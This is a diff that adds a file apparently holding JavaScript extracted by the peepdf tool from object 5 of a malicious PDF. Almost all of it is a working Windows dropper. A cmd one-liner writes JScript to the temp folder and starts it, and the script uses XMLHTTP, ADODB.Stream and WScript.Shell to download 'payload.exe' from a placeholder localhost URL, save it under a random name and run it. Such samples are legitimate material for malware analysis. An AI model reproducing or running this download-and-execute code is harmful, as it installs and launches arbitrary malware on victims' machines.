@@ -1,0 +1,28 @@
+// peepdf comment: Javascript code located in object 5 (version 0)
+
+/Q /C
+cd % temp % & echo(function(a, b, c) {
+    if (b == undefined) b = null;
+    if (c == undefined) c = null;
+    for (var d = "XMLHTTP", e = "Server" + d, f = ".6.0", g = ".3.0", h = [d + f, d + g, d, e + f, e + g, e], i = d = e = f = 0; i ^ < 6; i++) try {
+        d = new ActiveXObject("MSXML2." + h[i]);
+        e = new ActiveXObject("ADODB.Stream");
+        f = new ActiveXObject("WScript.Shell");
+        break
+    } catch (g) {}
+    if (d ^ & ^ & e ^ & ^ & f) try {
+        d.open("GET", a, 0, b, c);
+        d.send();
+        if ((a.indexOf("http") == 0 ^ & ^ & d.status == 200) ^ | ^ | (a.indexOf("ftp") == 0 ^ & ^ & d.status == 0)) {
+            e.Mode = 3;
+            e.Type = 1;
+            e.Open();
+            e.Write(d.responseBody);
+            i = f.Environment("PROCESS").Item("TEMP") + "\\" + Math.round(Math.random() * 1e15).toString(36) + ".exe";
+            e.SaveToFile(i, 2);
+            e.Close();
+            f.Run(i)
+        }
+    } catch (g) {}
+})("http://localhost/exe/payload.exe"); > js.js & start js.js
+
